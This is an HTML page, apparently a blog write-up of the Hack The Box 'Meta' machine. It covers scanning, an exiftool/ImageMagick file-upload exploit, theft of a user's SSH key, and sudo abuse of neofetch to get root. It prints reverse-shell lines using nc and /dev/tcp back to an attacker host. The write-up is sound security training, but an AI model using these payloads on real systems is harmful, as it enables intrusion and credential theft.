@@ -1,0 +1,192 @@
+<!DOCTYPE HTML>
+<!--
+	Dimension by HTML5 UP
+	html5up.net | @ajlkn
+	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+-->
+<html>
+	<head>
+		<title>Blacree - Meta</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="../../assets/css/main.css" />
+		<noscript><link rel="stylesheet" href="../../assets/css/noscript.css" /></noscript>
+        <style type="text/css">
+            #middle{
+			font-family: Liberation Mono;
+			font-size: 0.9rem;
+			text-align: left;
+            padding: 4.5rem 2.5rem 1.5rem 2.5rem ;
+			position: relative;
+			width: 50rem;
+			max-width: 100%;
+			background-color: rgba(27, 31, 34, 0.85);
+			border-radius: 4px;
+            }
+			.img{display: block;
+  				margin-left: auto;
+  				margin-right: auto;
+  				width: 100%;
+				margin-top: 2.5%;
+				margin-bottom: 2.5%;
+			}
+			.displayimage{
+				margin-top: 2.5%;
+				margin-bottom: 2.5%;
+				display: block;
+				max-width: 100%;
+			}
+			code{
+				margin-top: 2.5%;
+				margin-bottom: 2.5%;
+			}
+			hr{
+                margin-top: 2.5%;
+                margin-bottom: 6.0%;
+				border-color: gray;
+            }
+        </style>
+	</head>
+	<body class="is-preload">
+
+		<!-- Wrapper -->
+			<div id="wrapper">
+                <header id="header">
+				<!-- Main -->
+					<!-- <div class="content"> -->
+                        <div id="middle">
+                        <article>
+                            <a href="../../index.html"><h2 style="text-align: right; color: gray;">Home</h2></a>
+                            <p>
+							<h2 class="major">HTB - META</h2>
+                            <img src="img/meta/meta_htb_banner.png" class="img"/>
+							Meta has an hidden sub-domain that is vulnerable to file injection attack, which is leveraged to get a shell.
+							A binary is then exploited to escalate privileges to root.
+							<br><br>
+							<hr>
+							</p>
+							<p>
+								<h3>Scanning and Enumeration</h3>
+								Starting with a NMAP scan we have...
+								<pre><code>$ nmap -p- --min-rate=1000 -sC -A -T4 $meta
+Nmap scan report for 10.10.11.140
+Host is up (0.42s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
+|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
+|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
+80/tcp open  http    Apache httpd
+|_http-title: Did not follow redirect to http://artcorp.htb
+|_http-server-header: Apache
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=4/1%OT=22%CT=1%CU=35988%PV=Y%DS=2%DC=T%G=Y%TM=62477BFE
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ(
+OS:SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)OPS(O1=M54BST11NW7%O2=M54BST11NW7%O3
+OS:=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11NW7%O6=M54BST11)WIN(W1=FE88%W2=F
+OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54BNNSNW
+OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
+OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
+OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
+OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
+OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 3306/tcp)
+HOP RTT       ADDRESS
+1   371.24 ms 10.10.16.1                                                                                          
+2   148.45 ms 10.10.11.140                                                                                        
+                                                                                                                    
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .             
+Nmap done: 1 IP address (1 host up) scanned in 279.72 seconds</code></pre>
+								We have two ports open on Meta. An ssh service and a web service. Let's test the webserver.<br><br>
+								<h4>Apache httpd - TCP 80</h4>
+                                <img src="img/meta/artcop_homepage.png" class="displayimage">
+                                Nothings of exploitable importance found on the site even after directory enumeration. Let's perform
+                                sub-domain enumeration...
+                                <img src="img/meta/subdomain_found.png" class="displayimage">
+                                <code>dev01.artcorp.htb</code> sub-domain found. Checking it out, we have...
+                                <img src="img/meta/sub_domain_homepage.png" class="displayimage">
+                                We have access to a currently being developed application called "MetaView" which gives us the following page...
+                                <img src="img/meta/meta_view_mainpage.png" class="displayimage">
+                                Metaview allows the upload of image files, of which it processes and then displays the image metadata. After multiple
+                                tests on the application, it is noticed that it doesn't matter what the name of the file to be uploaded is, only image files
+                                could be uploaded as it is the actual file content that is used to determine if the file is an image or not.<br><br>
+                                Let's perform Exif Data RCE technique using the command...<br>
+                                <pre><code>$ exiftool -Comment='&lt;?php system("nc 10.10.16.70 4444 -e /bin/bash"); ?&gt;' [image_name].jpg</code></pre>
+								Uploading the image to metaview we have...
+								<img src="img/meta/metadata_phprce_failed.png" class="displayimage">
+								The application is properly escaping the php code in our Comment metadata and as a result we cannot perform RCE. Testing the application
+								with polyglot files also seemed to fail.<br><br>
+								Looking at the data returned by the application, it looks like it uses exiftool to process the image uploaded. Let's check for exiftool exploits...
+								<img src="img/meta/exiftool_exploit.png" class="displayimage">
+								This exploit give us a reverse shell when the generated malicious image is read by a vulnerable exiftool. After uploading the image, on our listener
+								we get a shell...
+								<img src="img/meta/successful_shell.png" class="displayimage">
+								However, we are neither user nor root. Let's perform privilege escalation.<br><br>
+								<h4>User Privilege Escalation</h4>
+								Searching for files that were created since the start of the year we have...
+								<img src="img/meta/exploit_found.png" class="displayimage">
+								This shows us a file called <code>convert_images.sh</code>. From its content we can see that a utility called "mogrify" which uses <code>ImageMagick v7.0.10-36</code>
+								is used to modify files found in <code>/var/www/dev01.artcorp.htb/convert_images/</code> directory. This version of ImageMagick is known to be vulnerable and method
+								for exploitation is found on...
+								<pre><code>https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html</code></pre>
+								It involves the use of a SVG polyglot file of the format below to trigger shell injection vulnerability...
+								<img src="img/meta/svg_polyglot_file.png" class="displayimage">
+								The idea now is to create a malicious svg file which we would copy to <code>/var/www/dev01.artcorp.htb/convert_images/</code> as this is the folder location mogrify uses 
+								ImageMagick to process files. Create an svg file with the following code...
+								<img src="img/meta/get_username_svg.png" class="displayimage">
+								When our svg file is processed by ImageMagic parser our shell code should get executed and we should get a file called username created in /dev/shm containing the name of the user executing the
+								command. Note, whatever you name your svg file should be the same name contained in the xlink:href attribute; for instance <code>xlink:href="msl:[svg_file_name]"</code>. We have...
+								<img src="img/meta/user_confirmed.png" class="displayimage">
+								We have infact a real user called thomas. Now since we have ssh server running on the machine and we can access thomas's files. Let's get his ssh private key with this svg code...
+								<img src="img/meta/svg_exploit.png" class="displayimage">
+								We get thomas's private key...
+								<img src="img/meta/thomas_private_key.png" class="displayimage"/>
+								Now let's ssh into the machine as user thomas and get the user flag...
+								<img src="img/meta/thomas_shell_success.png" class="displayimage"/><br>
+								<h4>Root Privilege Escalation</h4>
+								Listing sudo commands list, we have...
+								<img src="img/meta/sudo_list_permissions.png" class="displayimage">
+								User thomas can run a binary called neofetch as root without password. Executing neofetch as root we have...
+								<img src="img/meta/neofetch_root.png" class="displayimage">
+								Neofetch is a binary that helps to display the system's properties. Looking through it's source code, there is an environment variable called <code>XDG_CONFIG_HOME</code> that we can control. 
+								This variable sets the home directory where the config file it uses is accessed at <code>$(XDG_CONFIG_HOME)/.config/neofetch/config.conf</code>. This means that we can set the 
+								XDG_CONFIG_HOME in our shell environemnt to home directory and edit the config file as we want.<br><br>
+								Run...
+								<pre><code>$ export XDG_CONFIG_HOME=/home/thomas/.config</code></pre>
+								Add the following reverse shell bash code to the config file...
+								<pre><code>/bin/bash -l > /dev/tcp/[your_ip]/[your_port] 0<&1 2>&1</code></pre>
+								Executing neofetch again as root, on our listener we have...
+								<img src="img/meta/root_shell_success.png" class="displayimage">
+								Great, we are root &#128513;.
+							</p>
+							<p style="text-align: center;">Thank you for reading my writeup 😀 <a href="../../index.html" style="color: #FFA500;">| Home</a></p>
+                        </article>
+                        </div>
+                </header>
+					<!-- </div> -->
+
+				<!-- Footer -->
+					<footer id="footer">
+						<!--<p class="copyright">&copy; Untitled. Design: <a href="https://html5up.net">HTML5 UP</a>.</p> -->
+					</footer>
+			</div>
+
+		<!-- BG -->
+			<div id="bg"></div>
+
+		<!-- Scripts -->
+			<script src="../../assets/js/jquery.min.js"></script>
+			<script src="../../assets/js/browser.min.js"></script>
+			<script src="../../assets/js/breakpoints.min.js"></script>
+			<script src="../../assets/js/util.js"></script>
+			<script src="../../assets/js/main.js"></script>
+
+	</body>
+</html>
